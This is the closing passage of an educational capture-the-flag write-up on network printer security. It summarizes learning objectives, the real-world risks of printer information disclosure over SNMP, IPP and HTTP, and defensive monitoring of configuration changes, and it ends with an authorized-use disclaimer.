3. **Configuration Changes**
```bash
# Track and alert:
- Web interface logins
- Setting modifications
- Firmware updates
- Service enable/disable
```

### Student Learning Objectives Achieved

✓ **Protocol Enumeration**: Understanding multiple protocols on IoT devices  
✓ **Information Disclosure**: Recognizing data leakage through various services  
✓ **Metadata Analysis**: Extracting intelligence from document properties  
✓ **Multi-vector Attacks**: Using different protocols to achieve objectives  
✓ **Privacy Implications**: Understanding IoT privacy risks  
✓ **Defense Strategies**: Learning comprehensive security controls  

### Real-World Application

This CTF demonstrates realistic printer vulnerabilities found in corporate environments:

1. **Corporate Espionage**: Print jobs reveal merger documents, financial reports
2. **Social Engineering**: Contact information enables targeted attacks
3. **Physical Security**: Location data aids unauthorized access
4. **Compliance Violations**: Unencrypted PII transmission
5. **Insider Threats**: Job monitoring reveals suspicious activity

### Conclusion

Network printers represent a significant but often overlooked attack surface in IoT security. This CTF demonstrates how multiple protocols (SNMP, IPP, HTTP) expose sensitive information through different vectors. The five flags teach students to:

1. Enumerate all available protocols systematically
2. Understand protocol-specific information disclosure
3. Recognize metadata privacy implications
4. Correlate information across multiple sources
5. Implement comprehensive defense strategies

Key success factors for students:
- Patience in enumeration (checking all protocols)
- Understanding protocol interactions
- Reading complete outputs (not just searching for flags)
- Documenting intelligence beyond just flags
- Thinking about real-world implications

The challenge emphasizes that securing IoT devices requires understanding their complete attack surface, not just primary functions. Printers process sensitive documents, making their security critical for organizational data protection.

---

**Educational Use Only**: This material is for authorized security testing and education only. Never access systems without explicit permission. Use these techniques only in controlled lab environments or with written authorization from system owners.
